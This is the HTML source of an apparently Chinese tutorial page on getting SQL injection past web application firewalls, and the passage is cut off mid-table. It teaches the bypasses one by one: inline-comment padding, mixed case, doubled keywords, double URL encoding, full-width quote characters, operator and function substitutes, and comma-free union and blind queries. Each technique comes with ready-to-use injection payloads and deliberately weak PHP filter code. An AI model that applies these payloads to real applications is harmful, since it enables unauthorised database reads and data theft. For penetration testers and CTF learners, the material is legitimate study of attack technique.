&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &amp;#39;1,2 #&amp;#39;&amp;#39; at line 1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;干扰waf过滤&#34;&gt;干扰WAF过滤
&lt;/h3&gt;&lt;p&gt;有的WAF过滤覆盖的范围可能不够大，比如会过滤掉&lt;code&gt;order by&lt;/code&gt;，但是如果在中间加上&lt;code&gt;/*!10440*/&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; or 1=1 order/*!10440*/by 1#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样很可能就能让WAF识别错误，如果一个内联注释不行，就多来几个：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-texttext&#34; data-lang=&#34;texttext&#34;&gt;1&amp;#39; or 1=1 order/*!77777cz*//*!77777cz*/by 1#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者干脆使用普通的注释干扰：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; or 1=1 order/*%%!asd%%%%*/by 1#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3-大小写绕过&#34;&gt;#3 大小写绕过
&lt;/h2&gt;&lt;p&gt;有的WAF只针对小写的（或者大写的）查询语句做了过滤：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;strpos&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;union&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#56b6c2&#34;&gt;!&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mark&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;false&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;strpos&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;select&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#56b6c2&#34;&gt;!&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mark&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;false&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE user_id = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;然而很多sql数据库是不区分大小写的&lt;/strong&gt;，我们就可以大小写交错写来绕过：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; uNiOn sElEcT 1,database()#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4-双写绕过&#34;&gt;#4 双写绕过
&lt;/h2&gt;&lt;p&gt;部分WAF所做的工作只是简单的把不允许出现的查询内容（比如sql语句）替换成空字符串：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id_sanitized&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#c678dd&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;union&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;select&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;]; );
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE user_id = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id_sanitized&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这种过滤方式是很不可靠的，因为就算有危险内容，&lt;strong&gt;简陋过滤之后剩下的部分仍然会进入查询（一次过滤）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们就可以通过&amp;quot;双写&amp;quot;，&lt;strong&gt;比如&lt;code&gt;selselectect&lt;/code&gt;，替换中间的&lt;code&gt;select&lt;/code&gt;为空后，剩下的部分仍然是&lt;code&gt;select&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; uniunionon selselectect 1,2#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;过滤器替换后：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,2#
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;5-编码绕过&#34;&gt;#5 编码绕过
&lt;/h2&gt;&lt;p&gt;如果WAF针对关键词进行了区分大小写的过滤，这时候就不能通过大小写和双写蒙混过关了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;不过根据WAF一次过滤的特点，我们还是利用各种编码构造出payload&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;双重url编码绕过&#34;&gt;双重URL编码绕过
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;因为上传的payload只会url解析一次，我们把部分字符再次进行url编码：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union se%256cect 1,database()#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;WAF部分(&lt;code&gt;%25&lt;/code&gt; -&amp;gt; &lt;code&gt;%&lt;/code&gt;)看见的内容是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union se%6cect 1,database()#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行部分(&lt;code&gt;%6c&lt;/code&gt; -&amp;gt; &lt;code&gt;l&lt;/code&gt;)看见的是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,database()#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这就成功传入了目标语句&lt;/p&gt;
&lt;p&gt;附上一张url编码表：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/194720-20200610165300516-237246127.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;URL编码表&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;十六进制unicode编码ascii编码绕过&#34;&gt;十六进制、Unicode编码、ASCII编码绕过
&lt;/h3&gt;&lt;p&gt;其实就是把过滤的字符转换成不同的编码欺骗WAF，比如十六进制：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1%ef%bc%87 or 1=1#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;部分WAF无法解析%ef%bc%87，放行之后会在执行sql语句的服务器(比如IIS)解析，是全角字符&lt;code&gt;＇&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1＇ OR 1=1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当然你也能直接输入全角试试能不能绕过，这里只是举一个例子&lt;/p&gt;
&lt;p&gt;其他方式大同小异，这里不多赘述&lt;/p&gt;
&lt;h2 id=&#34;6-等价代替绕过&#34;&gt;#6 等价代替绕过
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;WAF限制了某一些的符号、语句或者函数，但我们可以设法找到功能一样或相似的来代替&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;逻辑符号过滤&#34;&gt;逻辑符号过滤
&lt;/h3&gt;&lt;h4 id=&#34;等号过滤绕过&#34;&gt;等号(=)过滤绕过
&lt;/h4&gt;&lt;p&gt;在SQL语句里，除了=，还有很多用于比较的运算符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;like&lt;/code&gt;：用于匹配字符串，&lt;code&gt;A like B&lt;/code&gt;表示B是A&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;in&lt;/code&gt;：用于查找目标是否在对应组中&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;rlike&lt;/code&gt;：只要匹配字符串出现即可，&lt;code&gt;A rlike B&lt;/code&gt;表示B在A里面&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;regexp&lt;/code&gt;：和&lt;code&gt;rlike&lt;/code&gt;用法一样&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;between&lt;/code&gt;：&lt;code&gt;expr between 下界 and 上界&lt;/code&gt;，表示是否&lt;code&gt;expr &amp;gt;= 下界 &amp;amp;&amp;amp; exp &amp;lt;= 上界&lt;/code&gt;，上下界可以相等&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果WAF过滤了=，我们可以使用他们实现相同目的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = &amp;#39;users&amp;#39;#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;like&lt;/code&gt;匹配：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name like &amp;#39;users&amp;#39;#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;in&lt;/code&gt;匹配（&lt;strong&gt;注意in匹配的对象要是一个组&lt;/strong&gt;）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name in (&amp;#39;users&amp;#39;)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;rlike&lt;/code&gt;/&lt;code&gt;regexp&lt;/code&gt;匹配：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name rlike &amp;#39;users&amp;#39;#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用between判断：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,group_concat(column_name) from information_schema.columns where table_name between &amp;#39;users&amp;#39; and &amp;#39;users&amp;#39;#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;大于号和小于号过滤绕过&#34;&gt;大于号(&amp;gt;)和小于号(&amp;lt;)过滤绕过
&lt;/h4&gt;&lt;p&gt;使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找&lt;/p&gt;
&lt;p&gt;如果无法使用比较操作符，那么就需要使用到greatest()和least()来进行绕过了&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;greatest(n1,n2,n3,&amp;hellip;)函数返回输入参数(n1,n2,n3,&amp;hellip;)的最大值，least()则是返回最小值：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and greatest(ascii(substr(database(),0,1)),64)=64
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;等价于：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and ascii(substr(database(),0,1))&amp;gt;64
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;and和or过滤绕过&#34;&gt;and和or过滤绕过
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;符号&lt;/th&gt;
          &lt;th&gt;等价符号&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;and&lt;/td&gt;
          &lt;td&gt;&amp;amp;&amp;amp;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;or&lt;/td&gt;
          &lt;td&gt;||&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;xor&lt;/td&gt;
          &lt;td&gt;|&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;not&lt;/td&gt;
          &lt;td&gt;!&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;注释符号过滤&#34;&gt;注释符号过滤
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;如果WAF过滤了&lt;code&gt;#&lt;/code&gt;和&lt;code&gt;-- &lt;/code&gt; ，我们可以使用另一个&lt;code&gt;&#39;&lt;/code&gt;闭合后面的&lt;code&gt;&#39;&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,2 or &amp;#39;1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,&amp;#39;2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;逗号过滤&#34;&gt;逗号过滤
&lt;/h3&gt;&lt;h4 id=&#34;绕过limit中的逗号&#34;&gt;绕过limit中的逗号
&lt;/h4&gt;&lt;p&gt;在进行盲注时，我们经常需要逐行读取数据，会用到&lt;code&gt;limit m, n&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用limit m offset n代替，表示取m行，跳过n行：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,database() limit 1 offset 0 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;等价于&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,database() limit 0,1 #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;绕过函数参数中的逗号&#34;&gt;绕过函数参数中的逗号
&lt;/h4&gt;&lt;p&gt;很多函数需要多个参数，用逗号隔开，例如&lt;code&gt;substring(string, m, n)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用substring(stringfrom m for n)代替：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and substring(database()from 1 for 1)=&amp;#39;d&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果空格被过滤了，可以使用()包裹from和for后面的数字：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and substring(database()from(1)for(1))=&amp;#39;d&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;绕过select列表中的逗号&#34;&gt;绕过select列表中的逗号
&lt;/h4&gt;&lt;p&gt;union联合查询注入时，我们经常需要一次性查询多个列，如&lt;code&gt;union select user, password&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可以使用join语句代替：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select * from (select database())a join (select version())b#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这段语句是如何工作的？我们逐一拆解：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;(select database())a&lt;/code&gt;&lt;/strong&gt;: 创建了一个只含一列（数据库名）的临时表，并别名为 &lt;code&gt;a&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;(select version())b&lt;/code&gt;&lt;/strong&gt;: 创建了另一个只含一列（版本信息）的临时表，并别名为 &lt;code&gt;b&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;... a join b&lt;/code&gt;&lt;/strong&gt;: 通过&lt;code&gt;join&lt;/code&gt;将这两个只有一行一列的表连接起来，形成一个一行两列的新表&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;select * from...&lt;/code&gt;&lt;/strong&gt;: 最后用 &lt;code&gt;select *&lt;/code&gt; 将这个新表的所有列（即我们想要的数据库名和版本信息）查询出来&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当然，select后面的内容可以改成你想要的内容，select的数量也根据字段数确定，多join几次就行&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;函数过滤&#34;&gt;函数过滤
&lt;/h3&gt;&lt;h4 id=&#34;常见函数过滤&#34;&gt;常见函数过滤
&lt;/h4&gt;&lt;p&gt;下面是一些常见的等价函数：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;常用函数&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;等价函数或语法&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;功能&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;substring(str, m, n)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;substr(str, m, n)&lt;/code&gt;&lt;br&gt;&lt;code&gt;mid(str, m, n)&lt;/code&gt;&lt;br /&gt;&lt;code&gt;reverse+left&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;截取字符串&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;ascii(char)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
